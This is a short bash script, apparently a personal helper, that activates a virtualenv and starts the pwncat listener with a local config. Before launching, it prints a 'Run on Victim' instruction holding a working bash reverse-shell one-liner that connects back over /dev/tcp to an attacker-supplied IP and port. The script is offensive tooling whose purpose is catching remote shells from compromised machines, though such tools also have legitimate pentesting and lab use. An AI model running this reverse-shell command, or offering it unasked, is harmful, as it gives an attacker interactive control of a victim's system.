#!/bin/bash

# turn list of arguments into string to pass them as is to pwncat
ARGS=$(echo "$@")
WD='/home/paul/repositories/pwncat/'

# activate virtualenv
CMD='source pwncat_venv/bin/activate'
# append pwncat command
CMD="$CMD"' && python -m pwncat --config data/pwncatrc '"$ARGS"

echo
echo "Run on Victim"
echo "command \"/bin/bash -c '/bin/bash -i >& /dev/tcp/\$IP/\$PORT 2>&1 0>&1'\""
echo
echo

# change WD
OLD_PWD=$(pwd)
cd $WD

# execute in own bash instance
# this prevents the virtualenv
echo running \""$CMD"\" in $(pwd)
echo ---------------start---------------
/bin/bash -c "$CMD"
echo ----------------end----------------

# return to previous directory
cd $OLD_PWD